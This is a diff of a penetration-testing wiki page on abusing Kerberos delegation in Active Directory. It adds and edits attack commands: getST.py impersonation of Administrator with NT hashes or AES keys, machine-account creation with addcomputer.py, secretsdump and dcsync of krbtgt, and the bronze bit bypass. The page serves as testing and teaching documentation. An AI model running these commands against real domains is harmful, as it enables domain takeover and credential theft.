@@ -14,11 +14,13 @@ With constrained and unconstrained delegations, the delegation attributes are se
 
 Kerberos delegations can be abused by attackers to obtain valuable assets and sometimes even domain admin privileges.
 
+{% hint style="danger" %}
+For any type of delegation \(unconstrained, constrained and resource-based constrained\), an account with `AccountNotDelegated`set can't be impersonated except if the domain controller is vulnerable to the [bronze bit](silver-and-golden-tickets.md#bronze-bit-cve-2020-17049) vulnerability \(CVE-2020-17049\).
+{% endhint %}
+
 ## Practice
 
-{% hint style="warning" %}
-For any type of delegation \(unconstrained, constrained and resource-based constrained\), an account with `AccountNotDelegated`set can't be impersonated
-{% endhint %}
+Some of the following parts allow to obtain modified or crafted Kerberos tickets. Once obtained, these tickets can be used with [Pass-the-Ticket](pass-the-ticket.md).
 
 ### Unconstrained Delegations
 
@@ -52,13 +54,6 @@ krbrelayx.py -aesKey 'MachineAccount_AES_key'
 ```
 
 Once the krbrelayx listener is ready, a [forced authentication attack](../forced-authentications/) \(e.g. [PrinterBug](../forced-authentications/#ms-rprn-abuse-a-k-a-printer-bug), [PrivExchange](../forced-authentications/#pushsubscription-abuse-a-k-a-privexchange)\) can be operated. The listener will then receive an authentication, hence a TGS, containing a TGT.
-
-That TGT can then be used with [pass-the-ticket](pass-the-ticket.md) capable tools like [Impacket](https://github.com/SecureAuthCorp/impacket) scripts.
-
-```bash
-export KRB5CCNAME=ticket.ccache
-secretsdump.py -k $TARGET
-```
 {% endtab %}
 
 {% tab title="From the compromised computer \(Windows\)" %}
@@ -82,6 +77,8 @@ lsadump::dcsync /dc:$DomainController /domain:$DOMAIN /user:krbtgt
 {% endtab %}
 {% endtabs %}
 
+The ticket can also be obtained with the [Impacket](https://github.com/SecureAuthCorp/impacket) script [getST](https://github.com/SecureAuthCorp/impacket/blob/master/examples/getST.py) \(Python\), just like with constrained delegation, when the unconstrained delegation computer account credentials are known \(see below for abuse notes\).
+
 ### Constrained Delegations
 
 If an account, configured with constrained delegation to a service, is compromised, an attacker can impersonate any user \(e.g. local admin\) in the environment to access that service.
@@ -97,20 +94,21 @@ The problem with constrained delegation is that an attacker in control of a KCD 
 
 {% tabs %}
 {% tab title="UNIX-like" %}
-The [Impacket](https://github.com/SecureAuthCorp/impacket) script [getST](https://github.com/SecureAuthCorp/impacket/blob/master/examples/getST.py) \(Python\) can perform all the necessary steps to obtain the final "impersonating" TGS \(in this case, "Administrator" is impersonated but it can be any user in the environment\).
+The [Impacket](https://github.com/SecureAuthCorp/impacket) script [getST](https://github.com/SecureAuthCorp/impacket/blob/master/examples/getST.py) \(Python\) can perform all the necessary steps to obtain the final "impersonating" TGS \(in this case, "Administrator" is impersonated/delegated account but it can be any user in the environment\).
 
-The input credentials are those of the compromised account configured with constrained delegations.
-
-```bash
-getST.py -spn $target_SPN -impersonate Admnistrator -dc-ip $DomainController $DOMAIN/$USER:$PASSWORD
-```
-
-The TGS can then be used with [pass-the-ticket](pass-the-ticket.md) to obtain access to the target service \(example with [secretsdump](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py)\).
+The input credentials are those of the compromised service account configured with constrained delegations.
 
 ```bash
-export KRB5CCNAME=Administrator.ccache
-secretsdump.py -k $TARGET
+# with an NT hash
+getST.py -spn $Target_SPN -impersonate Administrator -dc-ip $Domain_controller -hashes :$Controlled_service_NThash $Domain/$Controlled_service_account
+
+# with an AES (128 or 256 bits) key
+getST.py -spn $Target_SPN -impersonate Administrator -dc-ip $Domain_controller -aesKey $Controlled_service_AES_key $Domain/$Controlled_service_account
 ```
+
+The SPN \(ServicePrincipalName\) set will have an impact on what services will be reachable. For instance, `cifs/target.domain` or `host/target.domain` will allow most remote dumping operations \(more info on [adsecurity.org](https://adsecurity.org/?page_id=183)\).
+
+An account with `AccountNotDelegatedset` \(member of the "Protected users" group\) can't be impersonated except if the domain controller is vulnerable to the [bronze bit ](silver-and-golden-tickets.md#bronze-bit-cve-2020-17049)vulnerability \(CVE-2020-17049\). The `-force-forwardable` will try to exploit that vulnerability.
 {% endtab %}
 
 {% tab title="Windows" %}
@@ -142,7 +140,7 @@ In this situation, an attacker can obtain admin access to the target resource \(
 
 {% tabs %}
 {% tab title="UNIX-like" %}
-The [Impacket](https://github.com/SecureAuthCorp/impacket) script [addcomputer](https://github.com/SecureAuthCorp/impacket/blob/master/examples/addcomputer.py) can be used to create a computer account, using the credentials of a domain user \(with`ms-DS-MachineAccountQuota` &gt; 0, by default it is set to 10\).
+The [Impacket](https://github.com/SecureAuthCorp/impacket) script [addcomputer](https://github.com/SecureAuthCorp/impacket/blob/master/examples/addcomputer.py) \(Python\) can be used to create a computer account, using the credentials of a domain user \(with`ms-DS-MachineAccountQuota` &gt; 0, by default it is set to 10\).
 
 ```bash
 addcomputer.py -computer-name 'SHUTDOWN$' -computer-pass 'SomePassword' -dc-host $DomainController -domain-netbios $DOMAIN 'DOMAIN\anonymous:anonymous'
@@ -167,14 +165,23 @@ rbcd-permissions --cleanup -c 'CN=SHUTDOWN,OU=Computers,DC=DOMAIN,DC=LOCAL' -t '
 The [Impacket](https://github.com/SecureAuthCorp/impacket) script [getST](https://github.com/SecureAuthCorp/impacket/blob/master/examples/getST.py) \(Python\) can then perform all the necessary steps to obtain the final "impersonating" TGS \(in this case, "Administrator" is impersonated but it can be any user in the environment\).
 
 ```bash
-getST.py -spn $target_SPN -impersonate Admnistrator -dc-ip $DomainController 'DOMAIN/SHUTDOWN$:SomePassword'
+getST.py -spn $target_SPN -impersonate Administrator -dc-ip $DomainController 'DOMAIN/SHUTDOWN$:SomePassword'
 ```
 
+The SPN \(ServicePrincipalName\) set will have an impact on what services will be reachable. For instance, `cifs/target.domain` or `host/target.domain` will allow most remote dumping operations \(more info on [adsecurity.org](https://adsecurity.org/?page_id=183)\).
+
+An account with `AccountNotDelegatedset` \(member of the "Protected users" group\) can't be impersonated except if the domain controller is vulnerable to the [bronze bit ](silver-and-golden-tickets.md#bronze-bit-cve-2020-17049)vulnerability \(CVE-2020-17049\). The `-force-forwardable` will try to exploit that vulnerability.
+
 {% hint style="warning" %}
-In some mysterious cases, using [addcomputer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/addcomputer.py) to create a computer account resulted in the creation of a **disabled** computer account. Testers can use ntlmrelayx instead and use `--add-computer`, like [this](https://arkanoidctf.medium.com/hackthebox-writeup-forest-4db0de793f96).
+In some mysterious cases, using [addcomputer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/addcomputer.py) to create a computer account resulted in the creation of a **disabled** computer account. 
 {% endhint %}
 
-Impacket's ntlmrelayx can also conduct an RBCD abuse with the `--delegate-access` option \(see [NTLM relay](../abusing-ntlm/ntlm-relay.md)\).
+{% hint style="success" %}
+Testers can use ntlmrelayx 
+
+* for the computer account creation, instead of using [addcomputer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/addcomputer.py), with the`--add-computer` option, like [this](https://arkanoidctf.medium.com/hackthebox-writeup-forest-4db0de793f96)
+* to set the delegation rights with the `--delegate-access` option \(see [NTLM relay](../abusing-ntlm/ntlm-relay.md)\) instead of using [rbcd-attack](https://github.com/tothi/rbcd-attack) or [rbcd-permissions](https://github.com/NinjaStyle82/rbcd_permissions)
+{% endhint %}
 {% endtab %}
 
 {% tab title="Windows" %}
